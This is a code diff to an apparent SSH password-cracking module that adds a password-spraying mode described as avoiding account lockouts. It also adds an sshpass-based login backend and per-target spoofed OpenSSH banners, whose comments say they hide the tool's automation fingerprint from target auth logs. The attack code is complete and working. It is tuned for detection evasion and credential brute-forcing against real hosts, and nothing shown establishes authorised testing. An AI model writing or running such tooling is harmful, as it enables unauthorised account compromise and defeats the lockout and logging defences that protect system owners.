@@ -37,7 +37,7 @@ import socket
 from dataclasses import dataclass, field
 from typing import Iterable, Iterator
 
-from honeywatch.opsec import spoofed_ssh_banner as _spoofed_ssh_banner
+from honeywatch.opsec import spoofed_ssh_banner_for_target as _spoofed_ssh_banner_for_target
 
 __all__ = [
     "CrackAttempt",
@@ -90,6 +90,12 @@ class CrackTarget:
     ``users`` and ``passwords`` are explicit override lists. When either is
     empty the engine expands it from :func:`default_users` /
     :func:`candidate_passwords` (seeded by ``wordlist`` and ``mutations``).
+
+    ``spray_order`` (Finding #1) changes the iteration from grid order
+    (user1×all passwords, then user2×all passwords) to spray order (password1
+    across all users, then password2 across all users).  Grid order trips
+    account-lockout policies on the first user before the second is ever
+    tried; spray order is the lockout-safe pattern.
     """
 
     ip: str
@@ -107,6 +113,10 @@ class CrackTarget:
     # desired; set False only for auditing/coverage runs.
     stop_on_success: bool = True
     banner: str | None = None
+    # Spray order: iterate password×users (one password across all users
+    # before the next password) instead of the default user×passwords grid.
+    # The lockout-safe pattern — matches `spray`'s top-level approach.
+    spray_order: bool = False
 
 
 @dataclass
@@ -252,20 +262,94 @@ def candidate_passwords(
 # --------------------------------------------------------------------------- #
 
 
+def _sshpass_available() -> bool:
+    """Best-effort probe for the high-opsec sshpass+ssh backend (Finding #2)."""
+    import shutil
+    return bool(shutil.which("sshpass") and shutil.which("ssh"))
+
+
+def _attempt_login_sshpass(
+    ip: str, port: int, user: str, password: str, timeout_s: float,
+) -> CrackAttempt:
+    """sshpass+ssh login (genuine OpenSSH HASSH — no paramiko fingerprint tell).
+
+    Mirrors spray.py's backend selection: when sshpass is available, prefer it
+    over paramiko so the KEXINIT the server sees is the genuine OpenSSH algorithm
+    set, not paramiko's.  The password is passed via the SSHPASS env var so it
+    never appears in argv / process listings.
+    """
+    import os
+    import subprocess
+    attempt = CrackAttempt(user=user, password=password)
+    sshpass_bin = "sshpass"
+    ssh_bin = "ssh"
+    env = {
+        "HOME": os.environ.get("HOME", "/root"),
+        "PATH": os.environ.get("PATH", "/usr/local/bin:/usr/bin:/bin"),
+        "SSHPASS": password,
+        "USER": os.environ.get("USER", "root"),
+        "LANG": os.environ.get("LANG", "C.UTF-8"),
+        "TERM": os.environ.get("TERM", "xterm"),
+    }
+    argv = [
+        sshpass_bin, "-e", ssh_bin,
+        "-o", "StrictHostKeyChecking=no",
+        "-o", "UserKnownHostsFile=/dev/null",
+        "-o", "PreferredAuthentications=password",
+        "-o", "PubkeyAuthentication=no",
+        "-o", f"ConnectTimeout={int(max(1, timeout_s))}",
+        "-o", "NumberOfPasswordPrompts=1",
+        "-p", str(port),
+        f"{user}@{ip}", "exit",
+    ]
+    try:
+        proc = subprocess.run(
+            argv, capture_output=True, text=True,
+            timeout=timeout_s * 2 + 5,
+            env=env,
+        )
+    except FileNotFoundError as exc:
+        attempt.error = f"backend missing: {exc.filename or exc}"
+        return attempt
+    except subprocess.TimeoutExpired:
+        attempt.error = "timeout"
+        return attempt
+    except Exception as exc:
+        attempt.error = f"{type(exc).__name__}: {exc}"
+        return attempt
+    rc = proc.returncode
+    if rc == 0:
+        attempt.success = True
+    elif rc == 5:
+        attempt.success = False
+    else:
+        attempt.error = f"sshpass exit code {rc}"
+    return attempt
+
+
 def _attempt_login(
     ip: str,
     port: int,
     user: str,
     password: str,
     timeout_s: float,
+    use_sshpass: bool | None = None,
 ) -> CrackAttempt:
     """Synchronous one-shot SSH password auth. Never raises.
 
-    Opens a socket with an explicit timeout, hands it to a fresh
-    ``paramiko.Transport``, completes the key exchange, and calls
-    ``auth_password``. The result is normalized into a :class:`CrackAttempt`
-    so callers never need to introspect paramiko exception types.
+    Backend selection (Finding #2): when ``use_sshpass`` is True (or None and
+    sshpass is auto-detected), use ``sshpass + ssh`` so the server sees a
+    genuine OpenSSH HASSH fingerprint instead of paramiko's automation tell.
+    When sshpass is unavailable, fall back to paramiko (the original path).
     """
+    # Auto-detect sshpass when use_sshpass is None.
+    if use_sshpass is None:
+        use_sshpass = _sshpass_available()
+
+    if use_sshpass:
+        return _attempt_login_sshpass(ip, port, user, password, timeout_s)
+
+    # paramiko fallback (the original path).
     attempt = CrackAttempt(user=user, password=password)
     try:
         import paramiko  # type: ignore[import-not-found]
@@ -280,9 +364,11 @@ def _attempt_login(
         transport = paramiko.Transport(sock)
         # paramiko advertises "SSH-2.0-paramiko_X.Y.Z" by default -- an
         # instant automation-tool tell in target auth logs. Spoof a plausible
-        # OpenSSH banner drawn from a pool so two honeywatch instances don't
-        # share a client fingerprint.
-        banner = _spoofed_ssh_banner()
+        # OpenSSH banner, sticky per target so repeat crack attempts against
+        # one host present one consistent client identity (a real client's
+        # banner is fixed for its process); different targets and different
+        # instances draw independently, so no shared fingerprint.
+        banner = _spoofed_ssh_banner_for_target(ip, port)
         try:
             transport._CLIENT_IDENTITY = banner
         except Exception:
@@ -315,10 +401,11 @@ async def _attempt_async(
     user: str,
     password: str,
     timeout_s: float,
+    use_sshpass: bool | None = None,
 ) -> CrackAttempt:
     """Run one blocking login attempt off the event loop."""
     return await asyncio.to_thread(
-        _attempt_login, ip, port, user, password, timeout_s
+        _attempt_login, ip, port, user, password, timeout_s, use_sshpass
     )
 
 
@@ -372,17 +459,35 @@ async def crack_host(
 
     sem = asyncio.Semaphore(max(1, concurrency))
 
+    # Backend selection (Finding #2): auto-detect sshpass. When available,
+    # every attempt uses the genuine OpenSSH HASSH instead of paramiko's.
+    use_sshpass = _sshpass_available()
+
     async def try_one(user: str, password: str) -> CrackAttempt:
         async with sem:
             return await _attempt_async(
-                target.ip, target.port, user, password, target.timeout_s
+                target.ip, target.port, user, password, target.timeout_s,
+                use_sshpass=use_sshpass,
             )
 
-    # Fan out (user x password) combos. We materialize the user list (small)
-    # but stream passwords through the generator so a giant wordlist never
-    # fully lands in memory. The semaphore is what actually bounds in-flight
-    # work; the itertools.product is lazy on the password side.
-    pairs = itertools.product(users, password_iter)
+    # Iteration order (Finding #1):
+    # - Default (grid): itertools.product(users, password_iter) — user1×all
+    #   passwords, then user2×all passwords. Fast but trips lockouts.
+    # - spray_order=True: one password across all users before the next
+    #   password. Lockout-safe — matches `spray`'s top-level approach.
+    if target.spray_order:
+        # materialize passwords for the outer loop; users is already a list.
+        if target.passwords:
+            pw_list = target.passwords
+        else:
+            pw_list = list(candidate_passwords(
+                wordlist=target.wordlist, mutations=target.mutations
+            ))
+        pairs = itertools.product(pw_list, users)
+        # Swap the pair order: (password, user) → (user, password) for try_one.
+        pairs = ((u, p) for p, u in pairs)
+    else:
+        pairs = itertools.product(users, password_iter)
 
     async def runner() -> None:
         # Cap via max_attempts by simply stopping after N completions.
